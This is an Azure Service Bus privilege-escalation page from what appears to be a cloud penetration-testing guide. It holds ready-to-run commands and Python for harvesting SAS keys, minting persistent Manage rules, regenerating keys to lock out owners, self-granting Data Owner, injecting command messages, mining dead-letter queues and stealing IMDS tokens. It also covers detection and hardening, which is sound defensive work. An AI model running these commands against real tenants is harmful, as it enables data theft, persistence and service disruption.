---
cstg_id: CSTG-AZURE-SERVICE-BUS-PRIVESC
title: "AZURE Service Bus - Privilege Escalation"
provider: azure
service: service-bus
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - Microsoft.ServiceBus/namespaces/authorizationRules/listKeys/action
  - Microsoft.ServiceBus/namespaces/authorizationRules/write
  - Microsoft.ServiceBus/namespaces/authorizationRules/regenerateKeys/action
  - Microsoft.ServiceBus/namespaces/queues/authorizationRules/write
  - Microsoft.ServiceBus/namespaces/topics/authorizationRules/write
  - Microsoft.ServiceBus/namespaces/queues/write
  - Microsoft.ServiceBus/namespaces/topics/subscriptions/write
  - Microsoft.Authorization/roleAssignments/write
  - Microsoft.ServiceBus/namespaces/write
tools:
  - Azure CLI
  - Azure PowerShell (Az module)
  - Azure REST API
  - Service Bus AMQP/HTTP client libraries
references:
  - https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-sas
  - https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-authentication-and-authorization
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#integration
  - https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-managed-service-identity
  - https://learn.microsoft.com/en-us/azure/service-bus-messaging/message-sessions
  - https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-dead-letter-queues
  - https://learn.microsoft.com/en-us/rest/api/servicebus/
  - https://learn.microsoft.com/en-us/azure/service-bus-messaging/disable-local-authentication
license: CC BY-SA 4.0
---

## Summary

Privilege escalation against Azure Service Bus exploits the gap between Azure's
two authorisation planes and the fact that SAS keys are unconstrained, long-lived
bearer credentials. A principal that begins with only management-plane access can
escalate into full data-plane control (read, send, and tamper with every message),
and a principal with the right RBAC actions can grant itself or others Entra ID
data roles or mint new SAS keys to establish durable, hard-to-revoke access. In
the other direction, control of message *content* and *routing* can let a tester
escalate into the **consuming application's** trust domain — if a worker treats
queue messages as trusted commands, a Sender becomes an attacker against whatever
that worker can do (database writes, file operations, calling privileged APIs).

The principal escalation primitives are:

1. **Key listing** — `listKeys` converts management read into data-plane Listen+Send+Manage.
2. **Authorization-rule creation** — `authorizationRules/write` lets a holder mint
   new `Manage` keys, a self-promotion and persistence primitive that survives
   rotation of the original credential.
3. **Key regeneration** — `regenerateKeys/action` can be used to invalidate
   defenders' keys (denial of service / lockout) while issuing new attacker-held ones.
4. **RBAC data-role assignment** — `roleAssignments/write` at namespace scope lets
   a holder grant `Azure Service Bus Data Owner` to any principal, the cleanest
   route to Entra ID-native persistence even when `disableLocalAuth = true`.
5. **Message tampering and injection** — data-plane Send/Listen rights enable
   lateral movement into downstream consumers, and dead-letter mining harvests
   sensitive data.

Enumeration of the targets below is covered in
[Service Bus - Enumeration](../02-services/azure-service-bus-enum.md).

## Prerequisites

- An assumed-breach foothold: a compromised credential, leaked SAS connection
  string, or a managed identity / service principal token obtained from a
  compromised compute resource (App Service, Function, VM, AKS pod).
- For management-plane escalation paths: the specific `Microsoft.ServiceBus/*`
  actions listed per subsection below, typically delivered via Contributor, Owner,
  Azure Service Bus Data Owner, or a permissive custom role.
- For RBAC escalation: `Microsoft.Authorization/roleAssignments/write` (User Access
  Administrator or Owner) at namespace, RG, or subscription scope.
- For data-plane abuse: a SAS key/connection string, or an Entra token for a
  principal with a Service Bus data role.
- Network reachability to `<namespace>.servicebus.windows.net` (port 5671 AMQP or
  443 HTTPS), subject to namespace network rules.

## Enumeration

Confirm the escalation surface before acting (see the enumeration page for full
detail):

```bash
# Which rules exist and what rights do they carry?
az servicebus namespace authorization-rule list \
  --resource-group <RG> --namespace-name <NS> --query "[].{name:name, rights:rights}" -o table

# Is local (SAS) auth enabled? Does the namespace have a managed identity?
az servicebus namespace show -g <RG> -n <NS> \
  --query "{localAuth:properties.disableLocalAuth, identity:identity}" -o json

# What data-plane roles are already assigned, and at what scope?
az role assignment list --all \
  --scope "/subscriptions/<SUB>/resourceGroups/<RG>/providers/Microsoft.ServiceBus/namespaces/<NS>" \
  --query "[?contains(roleDefinitionName, 'Service Bus')]" -o table
```

## Misconfigurations & Findings

- A foothold principal holding `listKeys` over namespaces it has no business
  accessing (over-broad Contributor at subscription scope).
- `authorizationRules/write` granted to application identities, enabling silent
  key minting.
- `roleAssignments/write` (User Access Administrator/Owner) held by a workload
  identity, enabling self-promotion to Data Owner.
- Consuming applications that deserialize or `eval` message bodies, or that treat
  message properties as trusted command parameters — turning Send rights into code
  or logic execution in the consumer.
- `disableLocalAuth = false`, so newly minted SAS keys are immediately usable from
  the internet.
- No diagnostic logging, so data-plane interception and message deletion go
  unrecorded.

## Exploitation

### Microsoft.ServiceBus/namespaces/authorizationRules/listKeys/action

This single action is the most common escalation: it converts management-plane
read into full data-plane authority. Listing the keys of the default
`RootManageSharedAccessKey` (Listen+Send+Manage over the whole namespace) yields a
connection string usable from any client.

```bash
az servicebus namespace authorization-rule keys list \
  --resource-group <RG> --namespace-name <NS> \
  --name RootManageSharedAccessKey --query primaryConnectionString -o tsv
```

With the connection string, receive (destructively remove) or peek messages from
any entity in the namespace:

```python
from azure.servicebus import ServiceBusClient, ServiceBusReceiveMode
client = ServiceBusClient.from_connection_string("<CONN_STRING>")
with client.get_queue_receiver("<queue>", receive_mode=ServiceBusReceiveMode.PEEK_LOCK) as r:
    for msg in r.receive_messages(max_message_count=50, max_wait_time=5):
        print(str(msg))
        r.complete_message(msg)   # removes the message from the queue
```

Impact: full disclosure of in-flight business data and the ability to delete
messages (causing downstream processing loss).

### Microsoft.ServiceBus/namespaces/authorizationRules/write

`authorizationRules/write` (held implicitly by Contributor, Owner, and Azure
Service Bus Data Owner) lets the holder **create a brand-new authorization rule
with `Manage` rights**. This is a self-escalation and persistence primitive: the
new rule and its key are independent of any existing credential, so rotating or
revoking the original foothold credential does not invalidate it.

```bash
az servicebus namespace authorization-rule create \
  --resource-group <RG> --namespace-name <NS> \
  --name svc-sync-rule --rights Listen Send Manage

az servicebus namespace authorization-rule keys list \
  --resource-group <RG> --namespace-name <NS> \
  --name svc-sync-rule --query primaryConnectionString -o tsv
```

The same applies at entity scope (`queue authorization-rule create`,
`topic authorization-rule create`). A benign-sounding rule name blends into
operational noise. Because a `Manage` rule can itself create further rules, a
single such rule re-establishes full control after remediation of the original.

### Microsoft.ServiceBus/namespaces/authorizationRules/regenerateKeys/action

Key regeneration is dual-use. Defensively it rotates credentials; offensively it
enables **lockout / denial of service** and credential laundering. Regenerating
the key of a rule that legitimate applications depend on breaks those applications
until they pick up the new key — and the new key is now held by whoever performed
the regeneration.

```bash
az servicebus namespace authorization-rule keys renew \
  --resource-group <RG> --namespace-name <NS> \
  --name RootManageSharedAccessKey --key PrimaryKey
```

In a real assessment, prefer minting a *new* rule (previous subsection) over
regenerating a production rule, to avoid disrupting the target. Document
regeneration only if explicitly in scope, because it is destructive.

### Microsoft.Authorization/roleAssignments/write

A holder of this action (User Access Administrator or Owner) at namespace, RG, or
subscription scope can assign Entra ID data roles to any principal — including its
own. This is the strongest persistence path and works even when
`disableLocalAuth = true`, because it grants native Entra ID data-plane access
rather than relying on SAS keys.

```bash
# Grant Azure Service Bus Data Owner to an attacker-controlled principal
az role assignment create \
  --assignee <PRINCIPAL_OBJECT_ID> \
  --role "Azure Service Bus Data Owner" \
  --scope "/subscriptions/<SUB>/resourceGroups/<RG>/providers/Microsoft.ServiceBus/namespaces/<NS>"
```

The assigned principal can now receive, send, and manage all entities using its
own Entra token. Role assignments are quieter at the data plane than SAS keys and
do not appear in connection strings, making them harder to spot operationally.

### Data-plane Send rights — lateral movement into consumers

A principal holding only **Send** (via a `Send` SAS rule or `Azure Service Bus
Data Sender`) can inject crafted messages. Where the consuming worker trusts
message content — invoking commands named in the message, deserializing typed
payloads, or routing on properties — message injection becomes execution or
privileged action in the consumer's identity. This escalates from "can post to a
queue" to "can act as the backend worker".

```python
from azure.servicebus import ServiceBusClient, ServiceBusMessage
client = ServiceBusClient.from_connection_string("<SEND_ONLY_CONN_STRING>")
with client.get_queue_sender("<command-queue>") as sender:
    msg = ServiceBusMessage(
        '{"action":"export","target":"all-customers"}',
        application_properties={"role": "admin"},
    )
    sender.send_messages(msg)
```

For session-enabled queues, set `session_id` to target a specific consumer
session. Combine with scheduled enqueue (`scheduled_enqueue_time_utc`) for timed
delivery.

### Data-plane Listen rights — interception and dead-letter mining

A **Listen** credential can receive (and, in `PEEK_LOCK`/`RECEIVE_AND_DELETE`
mode, remove) messages, intercepting data destined for the legitimate consumer.
The dead-letter sub-queue is a particularly rich, low-noise target because failed
messages accumulate there and are rarely monitored:

```python
with client.get_queue_receiver(
        "<queue>", sub_queue="deadletter") as r:
    for msg in r.peek_messages(max_message_count=100):
        print(msg.dead_letter_reason, str(msg))
```

Peeking dead-letter contents is non-destructive and frequently surfaces sensitive
payloads that no consumer ever successfully processed.

### Managed-identity pivot when local auth is disabled

When `disableLocalAuth = true`, SAS paths are closed, but a managed identity on a
compromised consuming resource that holds a Service Bus data role provides
data-plane access. From the compromised host, obtain a token for the Service Bus
audience and use it directly:

```bash
# From within a compromised Azure compute resource (IMDS)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://servicebus.azure.net"
```

The returned bearer token is presented to the AMQP/HTTPS endpoint to receive or
send as the workload identity, inheriting whatever data role it holds.

## Detection & Logging

- **Azure Activity Log** is the primary signal for management-plane escalation.
  Alert on:
  - `Microsoft.ServiceBus/namespaces/authorizationRules/write` — new rule creation
    (key minting / persistence).
  - `.../authorizationRules/regenerateKeys/action` — key rotation that may indicate
    lockout or laundering.
  - `.../authorizationRules/listKeys/action` — key harvesting.
  - `Microsoft.Authorization/roleAssignments/write` scoped to a Service Bus
    namespace, especially granting `Azure Service Bus Data Owner`.

```bash
az monitor activity-log list -g <RG> --offset 7d \
  --query "[?contains(operationName.value, 'ServiceBus/namespaces/authorizationRules') || contains(operationName.value, 'roleAssignments/write')].{op:operationName.value, caller:caller, time:eventTimestamp}" -o table
```

- **Microsoft Entra ID audit logs** record the directory-side half of
  `roleAssignments/write` and the issuance of tokens for `https://servicebus.azure.net`.
  Correlate new data-role grants with subsequent sign-ins by the granted principal.
- **Entra ID sign-in logs** reveal managed-identity / service-principal token
  acquisition for the Service Bus resource from unexpected source IPs.
- **Namespace diagnostic logs** (Log Analytics) are required to see data-plane
  receive/send/dead-letter activity; without them, interception, injection, and
  message deletion are invisible. Their absence is a detection-gap finding.

## Remediation & Hardening

- Set `disableLocalAuth = true` to remove SAS bearer keys entirely; rely on Entra
  ID with Conditional Access.
- Apply least privilege: grant applications `Listen` or `Send` only, never `Manage`
  and never namespace-wide `RootManageSharedAccessKey`. Remove unused rules.
- Restrict `Microsoft.ServiceBus/namespaces/authorizationRules/write`,
  `.../listKeys/action`, and `.../regenerateKeys/action` to a small set of admin
  principals; keep them out of workload-identity role definitions.
- Restrict `Microsoft.Authorization/roleAssignments/write` (User Access
  Administrator/Owner) and review who can assign data roles at namespace, RG, and
  subscription scope; prefer PIM with approval and time-bound activation.
- Treat message bodies and properties as untrusted input in consumers: validate
  schema, avoid deserializing to arbitrary types, and never execute message-named
  commands without authorisation checks.
- Enforce private endpoints and `defaultAction: Deny` so even a minted key is
  unusable from the public internet.
- Enable namespace diagnostic settings and alert on rule creation, key listing,
  key regeneration, and Service Bus role assignments.
- Rotate the primary/secondary keys of any rule on a schedule and after any
  suspected exposure; deleting and recreating rules invalidates minted clones.

## Tools

- **Azure CLI** (`az servicebus`, `az role assignment`, `az rest`, `az monitor`).
- **Azure PowerShell (Az.ServiceBus, Az.Resources)**.
- **Azure Service Bus client libraries** — data-plane send/receive/peek and
  dead-letter access over AMQP/HTTP.
- **Azure Instance Metadata Service (IMDS)** — managed-identity token acquisition
  from compromised compute.
- **Azure REST API** — direct ARM rule/key/role operations.

## References

- Service Bus SAS — https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-sas
- Authentication and authorization — https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-authentication-and-authorization
- Built-in roles (Integration) — https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#integration
- Managed identities with Service Bus — https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-managed-service-identity
- Message sessions — https://learn.microsoft.com/en-us/azure/service-bus-messaging/message-sessions
- Dead-letter queues — https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-dead-letter-queues
- Disable local authentication — https://learn.microsoft.com/en-us/azure/service-bus-messaging/disable-local-authentication
- Service Bus REST API — https://learn.microsoft.com/en-us/rest/api/servicebus/
